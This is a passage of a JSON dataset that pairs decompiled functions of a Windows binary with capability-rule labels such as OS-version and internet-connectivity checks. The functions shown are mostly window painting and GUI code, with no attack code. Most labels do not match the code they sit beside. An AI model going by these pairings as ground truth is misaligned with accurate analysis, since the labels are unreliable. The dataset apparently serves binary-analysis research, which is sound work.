(*(*0x49169c + 0x30) == in_EAX)) {\n                fcn.00446870(0);\n            }\n            goto code_r0x0044aa2a;\n        }\n        if (iVar4 == 7) {\n            piVar3 = fcn.00458424();\n            if (((piVar3 != NULL) && (((*(piVar3 + 7) & 0x10) == 0 || (piVar3[0xc] == 0)))) &&\n               (cVar1 = (**(*piVar3 + 0xf8))(),  cVar1 == '\\0')) {\n                return;\n            }\n            goto code_r0x0044aa2a;\n        }\n        if (iVar4 != 8) goto code_r0x0044aa2a;\n        uVar2 = *(in_EAX + 0x15) & 0x20;\n    }\n    else {\n        if (0x2a3 < iVar4) {\n            if (iVar4 == 0xb047) {\n                piVar3 = fcn.00458424();\n                if ((piVar3 != NULL) && (piVar3 != in_EAX)) {\n                    fcn.00446870(param_2[2]);\n                }\n            }\n            else if (iVar4 == 0xb04a) {\n                if (param_2[1] != '\\0') {\n                    fcn.0044e6dc();\n                }\n                iStack72 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffb8;\n                (**(*in_EAX + 0xb0))();\n                *in_FS_OFFSET = iStack72;\n                if (param_2[1] != '\\0') {\n                    fcn.0044e6dc();\n                }\n                return;\n            }\n            goto code_r0x0044aa2a;\n        }\n        if (iVar4 == 0x2a3) {\n            *(in_EAX + 0x8e) = 0;\n            if (in_EAX[0x8f] == 0) {\n                fcn.00446870(0);\n            }\n            else {\n                fcn.00446870(0);\n            }\n            in_EAX[0x8f] = 0;\n            goto code_r0x0044aa2a;\n        }\n        if (9 < iVar4 - 0x100U) {\n            if (iVar4 - 0x200U < 0xb) {\n                if (iVar4 == 0x200) {\n                    fcn.00413a6c();\n                    fcn.0044502c();\n                    iVar4 = fcn.00443aec();\n                    *0x49169c = fcn.00442320();\n                    if (iVar4 != in_EAX[0x8f]) {\n                        if (((in_EAX[0x8f] != 0) && (*0x49169c == 0)) ||\n                           ((*0x49169c != 0 && (in_EAX[0x8f] == *0x49169c)))) {\n                            fcn.00446870(0);\n                        }\n                        if (in_EAX[0x8f] != 0) {\n                            fcn.0041b820();\n                        }\n                        in_EAX[0x8f] = iVar4;\n                        if (iVar4 != 0) {\n                            fcn.0041b5e0();\n                        }\n                        if (((in_EAX[0x8f] != 0) && (*0x49169c == 0)) ||\n                           ((*0x49169c != 0 && (in_EAX[0x8f] == *0x49169c)))) {\n                            iStack72 = 0x44a8a5;\n                            fcn.00446870(0);\n                        }\n                    }\n                    if (*(in_EAX + 0x8e) == '\\0') {\n                        *(in_EAX + 0x8e) = 1;\n                        fcn.0044d1c8();\n                        iStack72 = 0x44a8e4;\n                        sub.comctl32.dll__TrackMouseEvent();\n                    }\n                }\n                cVar1 = fcn.0044a510();\n                if (cVar1 != '\\0') {\n                    if (param_2[3] != 0) {\n                        return;\n                    }\n                    cVar1 = fcn.0044d568();\n                    if (cVar1 == '\\0') {\n                        return;\n                    }\n                    iStack72 = param_2[1];\n                    uVar6 = fcn.0044d1c8(*param_2);\n                    sub.user32.dll_DefWindowProcA(uVar6);\n                    return;\n                }\n            }\n            goto code_r0x0044aa2a;\n        }\n        uVar2 = fcn.00445de4();\n    }\n    if (uVar2 != 0) {\n        return;\n    }\ncode_r0x0044aa2a:\n    fcn.0044694c();\n    return;\n}\n",
        "token_count": 1619
    },
    "0044ab78": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044ab78(uint param_1, int32_t param_2)\n\n{\n    uchar *puVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack132;\n    uint uStack128;\n    uchar *puStack124;\n    int32_t iStack120;\n    int32_t iStack116;\n    uint *puStack112;\n    uchar *puStack108;\n    uint uStack104;\n    uint *puStack100;\n    uint var_50h;\n    int32_t hdc;\n    uint nSavedDC;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    hdc = *(param_2 + 4);\n    var_8h = param_2;\n    var_4h = in_EAX;\n    if (hdc == 0) {\n        puStack100 = &fcn.0044ab78::var_50h;\n        uStack104 = 0x44aba2;\n        uStack104 = fcn.0044d1c8();\n        puStack108 = 0x44aba8;\n        hdc = sub.user32.dll_BeginPaint();\n    }\n    puStack112 = 0x44acd7;\n    iStack116 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff8c;\n    if (var_4h[0x73] == 0) {\n        iStack120 = 0x44abd3;\n        puStack108 = &stack0xfffffffc;\n        (**(*var_4h + 0xc4))();\n        iStack120 = 0x44acae;\n        fcn.0044ad10();\n        *in_FS_OFFSET = iStack116;\n        puStack108 = 0x44acde;\n        if (*(var_8h + 4) == 0) {\n            puStack112 = &fcn.0044ab78::var_50h;\n            iStack116 = 0x44acd0;\n            iStack116 = fcn.0044d1c8();\n            iStack120 = 0x44acd6;\n            sub.user32.dll_EndPaint();\n        }\n        return;\n    }\n    iStack120 = hdc;\n    puStack124 = 0x44abe1;\n    puStack108 = &stack0xfffffffc;\n    nSavedDC = sub.gdi32.dll_SaveDC();\n    uStack128 = 0x44ac9a;\n    iStack132 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff7c;\n    iVar4 = 2;\n    iVar3 = *(var_4h[0x73] + 8);\n    puStack124 = &stack0xfffffffc;\n    puVar1 = &stack0xfffffffc;\n    if (-1 < iVar3 + -1) {\n        do {\n            puStack124 = puVar1;\n            iVar2 = fcn.00414eec();\n            if ((((*(iVar2 + 0x57) != '\\0') && (((*(iVar2 + 0x1c) & 0x10) == 0 || ((*(iVar2 + 0x55) & 8) == 0)))) ||\n                (((*(iVar2 + 0x1c) & 0x10) != 0 && (((*(iVar2 + 0x55) & 8) == 0 && ((*(iVar2 + 0x51) & 4) == 0)))))) &&\n               ((*(iVar2 + 0x50) & 0x40) != 0)) {\n                iStack132 = hdc;\n                iVar4 = sub.gdi32.dll_ExcludeClipRect();\n                if (iVar4 == 1) break;\n            }\n            iVar3 = iVar3 + -1;\n            puVar1 = puStack124;\n        } while (iVar3 != 0);\n    }\n    if (iVar4 != 1) {\n        (**(*var_4h + 0xc4))();\n    }\n    *in_FS_OFFSET = iStack132;\n    puStack124 = 0x44aca1;\n    uStack128 = nSavedDC;\n    iStack132 = hdc;\n    sub.gdi32.dll_RestoreDC();\n    return;\n}\n",
        "token_count": 947
    },
    "0044ad10": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044ad10(int32_t param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uVar4;\n    uint *arg_8h;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint *puStack76;\n    uint lprc;\n    int32_t var_18h;\n    uint nSavedDC;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint hDC;\n    int32_t var_4h;\n    \n    hDC = param_2;\n    var_4h = in_EAX;\n    if (((*(in_EAX + 0x1dc) != '\\0') && (*(in_EAX + 0x1db) != '\\0')) && (*(in_EAX + 0x1b0) != 0)) {\n        (**(**(in_EAX + 0x1b0) + 0x20))();\n    }\n    if (*(var_4h + 0x1cc) != 0) {\n        var_ch = 0;\n        if (param_1 != 0) {\n            var_ch = fcn.00414f48();\n            if (var_ch < 0) {\n                var_ch = 0;\n            }\n        }\n        var_10h = *(*(var_4h + 0x1cc) + 8);\n        if (var_ch < var_10h) {\n            do {\n                var_18h = fcn.00414eec();\n                if (((*(var_18h + 0x57) != '\\0') &&\n                    (((*(var_18h + 0x1c) & 0x10) == 0 || ((*(var_18h + 0x55) & 8) == 0)))) ||\n                   (((*(var_18h + 0x1c) & 0x10) != 0 &&\n                    (((*(var_18h + 0x55) & 8) == 0 && ((*(var_18h + 0x51) & 4) == 0)))))) {\n                    fcn.00413a94(&fcn.0044ad10::lprc, *(var_18h + 0x44) + *(var_18h + 0x4c));\n                    puStack76 = 0x44ae2d;\n                    iVar1 = sub.gdi32.dll_RectVisible();\n                    if (iVar1 != 0) {\n                        if ((*(var_4h + 0x54) & 0x80) != 0) {\n                            *(var_18h + 0x54) = *(var_18h + 0x54) | 0x80;\n                        }\n                        puStack76 = hDC;\n                        puStack80 = 0x44ae50;\n                        nSavedDC = sub.gdi32.dll_SaveDC();\n                        uStack84 = 0x44aebd;\n                        uStack88 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffffa8;\n                        puStack80 = &stack0xfffffffc;\n                        fcn.00443b80();\n                        sub.gdi32.dll_IntersectClipRect(hDC, 0, 0, *(var_18h + 0x48), *(var_18h + 0x4c));\n                        uVar4 = 0;\n                        fcn.00446870(0);\n                        *in_FS_OFFSET = uVar4;\n                        sub.gdi32.dll_RestoreDC(hDC, nSavedDC, 0x44aec4);\n                        return;\n                    }\n                }\n                var_ch = var_ch + 1;\n            } while (var_ch < var_10h);\n        }\n    }\n    if ((*(var_4h + 0x1d0) != 0) && (iVar1 = *(*(var_4h + 0x1d0) + 8),  -1 < iVar1 + -1)) {\n        var_ch = 0;\n        do {\n            iVar2 = fcn.00414eec();\n            if (((*(iVar2 + 0x1d9) != '\\0') && ((*(iVar2 + 0x50) & 0x10) != 0)) &&\n               ((*(iVar2 + 0x57) != '\\0' || (((*(iVar2 + 0x1c) & 0x10) != 0 && ((*(iVar2 + 0x51) & 4) == 0)))))) {\n                fcn.0042074c();\n                uVar4 = sub.gdi32.dll_CreateSolidBrush();\n                puStack76 = 0x44af76;\n                fcn.00413a94(&fcn.0044ad10::lprc, *(iVar2 + 0x44) + *(iVar2 + 0x4c));\n                puStack76 = &fcn.0044ad10::lprc;\n                puStack80 = hDC;\n                uStack84 = 0x44af83;\n                sub.user32.dll_FrameRect();\n                uStack88 = 0x44af89;\n                uStack84 = uVar4;\n                sub.gdi32.dll_DeleteObject();\n                uStack88 = 0x44af93;\n                uStack88 = fcn.0042074c();\n                uVar3 = sub.gdi32.dll_CreateSolidBrush();\n                iVar2 = *(iVar2 + 0x44) + *(iVar2 + 0x4c) + 1;\n                arg_8h = &fcn.0044ad10::lprc;\n                uVar4 = uVar3;\n                fcn.00413a94(arg_8h, iVar2);\n                sub.user32.dll_FrameRect(hDC, &fcn.0044ad10::lprc, arg_8h, iVar2, uVar4);\n                sub.gdi32.dll_DeleteObject(uVar3);\n            }\n            var_ch = var_ch + 1;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 1365
    },
    "0044afe0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044afe0(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint in_EDX;\n    int32_t iVar4;\n    uint uVar5;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    int32_t lprc;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint nSavedDC;\n    uint hdc;\n    int32_t var_4h;\n    \n    *(in_EAX + 0x54) = *(in_EAX + 0x54) | 0x80;\n    puStack48 = 0x44b002;\n    hdc = in_EDX;\n    var_4h = in_EAX;\n    nSavedDC = sub.gdi32.dll_SaveDC();\n    uStack52 = 0x44b158;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    fcn.00443b80();\n    sub.gdi32.dll_IntersectClipRect(hdc, 0, 0, *(var_4h + 0x48), *(var_4h + 0x4c));\n    iVar4 = 0;\n    uVar5 = 0;\n    uVar1 = fcn.0044d1c8(0xffffffec);\n    uVar2 = sub.user32.dll_GetWindowLongA(uVar1);\n    if ((uVar2 & 0x200) == 0) {\n        uVar1 = fcn.0044d1c8(0xfffffff0);\n        uVar2 = sub.user32.dll_GetWindowLongA(uVar1);\n        if ((uVar2 & 0x800000) != 0) {\n            uVar5 = 3;\n            iVar4 = 0xa00f;\n        }\n    }\n    else {\n        uVar5 = 10;\n        iVar4 = 0x200f;\n    }\n    if (iVar4 != 0) {\n        sub.user32.dll_SetRect(&fcn.0044afe0::lprc, 0, 0, *(var_4h + 0x48), *(var_4h + 0x4c));\n        sub.user32.dll_DrawEdge(hdc, &fcn.0044afe0::lprc, uVar5, iVar4);\n        fcn.00443b80();\n        sub.gdi32.dll_IntersectClipRect(hdc, 0, 0, var_14h - lprc, var_10h - var_18h);\n    }\n    fcn.00446870(0);\n    uVar1 = 0;\n    fcn.00446870(0);\n    if ((*(var_4h + 0x1d0) != 0) && (iVar4 = *(*(var_4h + 0x1d0) + 8),  -1 < iVar4 + -1)) {\n        do {\n            iVar3 = fcn.00414eec();\n            if (*(iVar3 + 0x57) != '\\0') {\n                uVar1 = *(iVar3 + 0x44);\n                fcn.0044afe0(uVar1);\n            }\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n    }\n    *in_FS_OFFSET = uVar1;\n    sub.gdi32.dll_RestoreDC(hdc, nSavedDC, 0x44b15f);\n    return;\n}\n",
        "token_count": 815
    },
    "0044b170": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044b170(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack172;\n    uint uStack168;\n    uchar *puStack164;\n    uint uStack160;\n    uint uStack156;\n    uint uStack152;\n    uint uStack148;\n    uint uStack144;\n    uint uStack140;\n    uint uStack136;\n    uint uStack132;\n    uint uStack128;\n    uint var_6ch;\n    uint nWidth;\n    uint var_5ch;\n    uint nHeight;\n    uint var_4ch;\n    uint var_ch;\n    uint hgdiobj;\n    uint hdc;\n    \n    if ((*(in_EAX + 0x90) != '\\0') && (*(param_2 + 4) == 0)) {\n        uStack128 = 0;\n        uStack132 = 0x44b1c0;\n        uVar2 = sub.user32.dll_GetDC();\n        uStack132 = 0x44b1cc;\n        (**(*in_EAX + 0x44))();\n        uStack136 = 0x44b1da;\n        (**(*in_EAX + 0x44))();\n        uStack144 = 0x44b1e4;\n        uStack140 = uVar2;\n        hgdiobj = sub.gdi32.dll_CreateCompatibleBitmap();\n        uStack148 = 0;\n        uStack152 = 0x44b1ef;\n        uStack144 = uVar2;\n        sub.user32.dll_ReleaseDC();\n        uStack152 = 0;\n        uStack156 = 0x44b1f6;\n        uStack160 = sub.gdi32.dll_CreateCompatibleDC();\n        uStack156 = hgdiobj;\n        puStack164 = 0x44b206;\n        hdc = uStack160;\n        var_ch = sub.gdi32.dll_SelectObject();\n        uStack168 = 0x44b2c2;\n        uStack172 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff54;\n        puStack164 = &stack0xfffffffc;\n        uVar2 = fcn.0044d1c8(&fcn.0044b170::var_4ch);\n        uVar2 = sub.user32.dll_BeginPaint(uVar2);\n        fcn.00446870(hdc);\n        *(param_2 + 4) = hdc;\n        fcn.0044b170();\n        *(param_2 + 4) = 0;\n        (**(*in_EAX + 0x44))(hdc, 0, 0, 0xcc0020);\n        (**(*in_EAX + 0x44))(nHeight);\n        sub.gdi32.dll_BitBlt(uVar2, 0, 0, nWidth);\n        uVar2 = fcn.0044d1c8(&fcn.0044b170::var_4ch);\n        sub.user32.dll_EndPaint();\n        *in_FS_OFFSET = uVar2;\n        sub.gdi32.dll_SelectObject(hdc, var_ch, 0x44b2c9);\n        sub.gdi32.dll_DeleteDC(hdc);\n        sub.gdi32.dll_DeleteObject(hgdiobj);\n        return;\n    }\n    if ((*(in_EAX + 0x55) & 1) == 0) {\n        uStack128 = 0x44b199;\n        iVar1 = fcn.00449558();\n        if (iVar1 == 0) {\n            uStack128 = 0x44b1a6;\n            (**(*in_EAX + -0x10))();\n            return;\n        }\n    }\n    uStack128 = 0x44b1b4;\n    fcn.0044ab78();\n    return;\n}\n",
        "token_count": 849
    },
    "0044b504": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044b504(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    uint8_t uVar2;\n    uchar uVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    uint16_t uVar5;\n    \n    if ((((*(in_EAX + 0x1d9) == '\\0') || ((*(in_EAX + 0x50) & 0x10) == 0)) || (*(in_EAX + 0x30) == 0)) ||\n       ((*(*(param_2 + 8) + 0x18) & 8) != 0)) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    if ((*(*(param_2 + 8) + 0x18) & 2) == 0) {\n        iVar4 = sub.user32.dll_IsWindowVisible(*(in_EAX + 0x1b4), param_1);\n        if (iVar4 == 0) goto code_r0x0044b549;\n        uVar2 = 1;\n    }\n    else {\ncode_r0x0044b549:\n        uVar2 = 0;\n    }\n    if ((*(*(param_2 + 8) + 0x18) & 1) == 0) {\n        iVar4 = sub.user32.dll_IsWindowVisible(*(in_EAX + 0x1b4));\n        if (iVar4 != 0) {\n            uVar3 = 1;\n            goto code_r0x0044b571;\n        }\n    }\n    uVar3 = 0;\ncode_r0x0044b571:\n    uVar5 = CONCAT11(uVar3, uVar2);\n    if ((bVar1) && ((uVar2 | uVar5 >> 8) != 0)) {\n        fcn.0044d0cc();\n    }\n    if ((*(in_EAX + 0x55) & 2) == 0) {\n        fcn.0044d574();\n    }\n    fcn.00447678();\n    if ((bVar1) && (((uVar5 | uVar5 >> 8) != 0 || ((*(*(param_2 + 8) + 0x18) & 0xc0) != 0)))) {\n        fcn.0044d0cc();\n    }\n    return;\n}\n",
        "token_count": 533
    },
    "0044ba34": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044ba34(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint arg_8h_00;\n    int32_t iVar1;\n    \n    arg_8h_00 = fcn.00413a84();\n    iVar1 = fcn.00446870(arg_8h_00);\n    if ((-1 < iVar1) && (*(in_EAX + 0x1e2) != 0)) {\n        (**(in_EAX + 0x1e0))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 128
    },
    "0044ba84": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044ba84(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x1ea) != 0) {\n        (**(in_EAX + 0x1e8))(arg_8h, arg_ch, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 88
    },
    "0044bbb4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044bbb4(uint arg_8h, uint *arg_ch)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint var_8h;\n    uint uStack8;\n    \n    var_8h = *arg_ch;\n    uStack8 = arg_ch[1];\n    uVar1 = fcn.0044d1c8();\n    sub.user32.dll_GetWindowRect(uVar1);\n    sub.user32.dll_InflateRect();\n    if (*(in_EAX + 0x202) != 0) {\n        (**(in_EAX + 0x200))(arg_8h, &var_8h);\n    }\n    return;\n}\n",
        "token_count": 153
    },
    "0044bc10": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.0044bc10(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.0044bb7c();\n    if ((0 < iVar1) && (iVar3 = iVar1 + -1,  -1 < iVar3)) {\n        do {\n            iVar2 = fcn.00414eec();\n            if (*(iVar2 + 0x57) == '\\0') {\n                iVar1 = iVar1 + -1;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != -1);\n    }\n    return iVar1;\n}\n",
        "token_count": 146
    },
    "0044bcf0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044bcf0(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x44bd98;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if ((param_2 != *(in_EAX + 0x1dc)) && (*(in_EAX + 0x1dc) = param_2,  (*(in_EAX + 0x1c) & 0x10) == 0)) {\n        fcn.00442e80();\n        if (param_2 == '\\0') {\n            fcn.00403f58();\n            *(in_EAX + 0x1ac) = 0;\n            fcn.00406570();\n        }\n        else {\n            if (*(in_EAX + 0x1ac) == 0) {\n                uVar1 = fcn.00403f28();\n                *(in_EAX + 0x1ac) = uVar1;\n            }\n            fcn.00404154();\n            fcn.00406588();\n        }\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x44bd9f;\n    uStack28 = 0x44bd97;\n    fcn.00406570();\n    return;\n}\n",
        "token_count": 350
    },
    "0044bda8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044bda8(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uint *puStack48;\n    uint uStack44;\n    uint var_18h;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (*(param_2 + 0xc) == 0) {\n        iVar1 = *(param_2 + 4);\n        var_18h = *(iVar1 + 0x4c);\n        uStack24 = *(iVar1 + 0x50);\n        uStack20 = *(iVar1 + 0x54);\n        uStack16 = *(iVar1 + 0x58);\n        uStack44 = 2;\n        puStack48 = &fcn.0044bda8::var_18h;\n        uStack52 = 0x44bde2;\n        var_8h = param_2;\n        var_4h = in_EAX;\n        uStack52 = fcn.0044d1c8();\n        uStack56 = 0;\n        puStack60 = 0x44bdea;\n        sub.user32.dll_MapWindowPoints();\n        puStack60 = 0x44bdf2;\n        fcn.00449074();\n        uStack64 = 0x44be6b;\n        uStack68 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffbc;\n        puStack60 = &stack0xfffffffc;\n        fcn.00404154();\n        if ((*(var_4h + 0x1db) != '\\0') && (*(var_4h + 0x1b0) != 0)) {\n            (**(**(var_4h + 0x1b0) + 0x18))(*(*(var_8h + 4) + 0x60));\n        }\n        *in_FS_OFFSET = uStack68;\n        puStack60 = 0x44be72;\n        uStack64 = 0x44be6a;\n        fcn.0044907c();\n        return;\n    }\n    return;\n}\n",
        "token_count": 531
    },
    "0044bec0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0044bec0(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x44bed5;\n    iVar2 = (**(*in_EAX + 0x58))();\n    puStack24 = 0x44bedf;\n    iVar3 = fcn.00403e30();\n    if (iVar2 == iVar3) {\n        cVar1 = *(in_EAX + 0x57);\n        uStack28 = 0x44bf2b;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        puStack24 = &stack0xfffffffc;\n        fcn.00404154();\n        *in_FS_OFFSET = uStack32;\n        puStack24 = 0x44bf3c;\n        if (cVar1 != '\\0') {\n            uStack28 = 0x44bf2a;\n            fcn.0044580c();\n        }\n        return;\n    }\n    puStack24 = 0x44bf3c;\n    fcn.00447a8c();\n    return;\n}\n",
        "token_count": 297
    },
    "0044c1ec": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.0044c1ec(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x1da) != '\\0') && (iVar2 = fcn.00449558(),  -1 < iVar2 + -1)) {\n        do {\n            piVar3 = fcn.0044951c();\n            if (((*(piVar3 + 0x57) != '\\0') && (cVar1 = (**(*piVar3 + 0x50))(),  cVar1 != '\\0')) &&\n               ((((*(piVar3 + 0x52) & 1) != 0 && (iVar4 = fcn.00446870(*(*(arg_8h + -4) + 8)),  iVar4 != 0)) ||\n                ((cVar1 = fcn.004040e4(),  cVar1 != '\\0' && (cVar1 = fcn.0044c1ec(arg_8h),  cVar1 != '\\0')))))) {\n                return 1;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 305
    },
    "0044c514": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044c514(uint param_1, int32_t param_2)\n\n{\n    fcn.00447844();\n    if ((*(*0x492d08 + 0xd) != '\\0') && (*(param_2 + 4) == 0)) {\n        fcn.00449ecc();\n    }\n    fcn.004495e8();\n    return;\n}\n",
        "token_count": 87
    },
    "0044cd74": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044cd74(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iStack32;\n    \n    iVar4 = *(in_EAX + 0x1b4);\n    if ((iVar4 == 0) || (iVar3 = sub.user32.dll_IsWindowVisible(),  iStack32 = iVar4,  iVar3 == 0)) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    if (bVar1) {\n        sub.user32.dll_ScrollWindow(*(in_EAX + 0x1b4), iStack32, param_2, 0, 0);\n    }\n    iVar4 = fcn.00449558();\n    if (-1 < iVar4 + -1) {\n        do {\n            iVar3 = fcn.0044951c();\n            cVar2 = fcn.004040e4();\n            if ((cVar2 == '\\0') || (*(iVar3 + 0x1b4) == 0)) {\n                *(iVar3 + 0x40) = *(iVar3 + 0x40) + iStack32;\n                *(iVar3 + 0x44) = *(iVar3 + 0x44) + param_2;\n            }\n            else if (!bVar1) {\n                iStack32 = *(iVar3 + 0x1b4);\n                sub.user32.dll_SetWindowPos();\n            }\n            iVar4 = iVar4 + -1;\n        } while 